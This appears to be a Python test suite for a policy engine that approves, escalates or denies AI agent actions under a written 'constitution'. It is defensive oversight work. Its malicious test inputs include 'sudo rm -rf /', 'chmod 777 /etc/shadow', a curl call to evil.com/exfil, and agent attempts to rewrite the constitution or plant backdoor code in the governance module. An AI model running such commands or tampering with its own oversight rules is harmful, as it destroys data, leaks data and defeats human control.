"""
Policy Engine Test Suite
Submits safe, escalatable, and malicious proposals to verify
that the engine enforces every constitutional invariant.

Usage:  python tests/test_policy.py
"""

from __future__ import annotations

import sys
from pathlib import Path

# Ensure project root is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from governance.policy_engine import Decision, PolicyEngine

# ---------------------------------------------------------------------------
# Test harness
# ---------------------------------------------------------------------------

passed = 0
failed = 0


def assert_decision(label: str, eval_output, expected_decision: Decision,
                    min_risk: float = 0.0):
    global passed, failed
    # evaluate_proposal returns (PolicyResult, event_id)
    result, event_id = eval_output
    ok = (
        result.decision == expected_decision
        and result.risk_score >= min_risk
    )
    status = "PASS" if ok else "FAIL"
    if ok:
        passed += 1
    else:
        failed += 1

    print(f"  [{status}] {label}")
    print(f"         Decision:   {result.decision.value} "
          f"(expected {expected_decision.value})")
    print(f"         Risk Score: {result.risk_score:.2f}")
    if result.violations:
        for v in result.violations:
            print(f"         Violation:  [{v.rule}] {v.description}")
    print()


# ---------------------------------------------------------------------------
# Test cases
# ---------------------------------------------------------------------------

def main():
    engine = PolicyEngine()

    print(f"Constitution loaded: {len(engine.rules)} rules parsed\n")
    for r in engine.rules:
        print(f"  {r.ref}: {r.text[:80]}")
    print()

    # -----------------------------------------------------------------------
    # 1. SAFE proposals — should be APPROVED
    # -----------------------------------------------------------------------
    print("=" * 60)
    print("SAFE PROPOSALS (expect APPROVED)")
    print("=" * 60)

    assert_decision(
        "Read a normal file",
        engine.evaluate_proposal({
            "actor_id": "agent:executor",
            "action_type": "file_read",
            "content": "src/main.py",
        }),
        Decision.APPROVED,
    )

    assert_decision(
        "Run a harmless ls command",
        engine.evaluate_proposal({
            "actor_id": "agent:executor",
            "action_type": "bash",
            "content": "ls -la /tmp",
        }),
        Decision.APPROVED,
    )

    assert_decision(
        "Write to a non-protected path",
        engine.evaluate_proposal({
            "actor_id": "agent:architect",
            "action_type": "file_write",
            "content": "print('hello')",
            "target_path": "src/utils/helper.py",
        }),
        Decision.APPROVED,
    )

    # -----------------------------------------------------------------------
    # 2. ESCALATED proposals — violate §II but below DENIED threshold
    # -----------------------------------------------------------------------
    print("=" * 60)
    print("ESCALATABLE PROPOSALS (expect ESCALATED)")
    print("=" * 60)

    assert_decision(
        "Unproxied curl call (§II gateway bypass)",
        engine.evaluate_proposal({
            "actor_id": "agent:executor",
            "action_type": "bash",
            "content": "curl https://api.example.com/data",
        }),
        Decision.ESCALATED,
        min_risk=0.5,
    )

    assert_decision(
        "Unproxied wget call (§II gateway bypass)",
        engine.evaluate_proposal({
            "actor_id": "agent:executor",
            "action_type": "bash",
            "content": "wget https://files.example.com/payload.tar.gz",
        }),
        Decision.ESCALATED,
        min_risk=0.5,
    )

    # -----------------------------------------------------------------------
    # 3. DENIED proposals — violate §I (governance invariant)
    # -----------------------------------------------------------------------
    print("=" * 60)
    print("MALICIOUS PROPOSALS (expect DENIED)")
    print("=" * 60)

    assert_decision(
        "sudo rm -rf / (§II: sudo + destructive rm)",
        engine.evaluate_proposal({
            "actor_id": "agent:rogue",
            "action_type": "bash",
            "content": "sudo rm -rf /",
        }),
        Decision.DENIED,
        min_risk=0.8,
    )

    assert_decision(
        "chmod 777 on sensitive file (§II)",
        engine.evaluate_proposal({
            "actor_id": "agent:rogue",
            "action_type": "bash",
            "content": "chmod 777 /etc/shadow",
        }),
        Decision.ESCALATED,
        min_risk=0.5,
    )

    assert_decision(
        "Modify CONSTITUTION.md (§I.2: Authority Decoupling)",
        engine.evaluate_proposal({
            "actor_id": "agent:architect",
            "action_type": "file_edit",
            "content": "Remove invariant §I.1",
            "target_path": "CONSTITUTION.md",
        }),
        Decision.DENIED,
        min_risk=0.8,
    )

    assert_decision(
        "Write to governance/ directory (§I.2: Authority Decoupling)",
        engine.evaluate_proposal({
            "actor_id": "agent:executor",
            "action_type": "file_write",
            "content": "backdoor code",
            "target_path": "governance/policy_engine.py",
        }),
        Decision.DENIED,
        min_risk=0.8,
    )

    assert_decision(
        "Delete from policy/ directory (§I.2: Authority Decoupling)",
        engine.evaluate_proposal({
            "actor_id": "agent:rogue",
            "action_type": "file_delete",
            "content": "",
            "target_path": "policy/rules.yaml",
        }),
        Decision.DENIED,
        min_risk=0.8,
    )

    assert_decision(
        "sudo chmod 777 with curl (§II: triple violation)",
        engine.evaluate_proposal({
            "actor_id": "agent:rogue",
            "action_type": "bash",
            "content": "sudo chmod 777 /tmp/x && curl http://evil.com/exfil",
        }),
        Decision.DENIED,
        min_risk=0.8,
    )

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    print("=" * 60)
    total = passed + failed
    print(f"RESULTS: {passed}/{total} passed, {failed}/{total} failed")
    print("=" * 60)

    return failed == 0


if __name__ == "__main__":
    ok = main()
    sys.exit(0 if ok else 1)
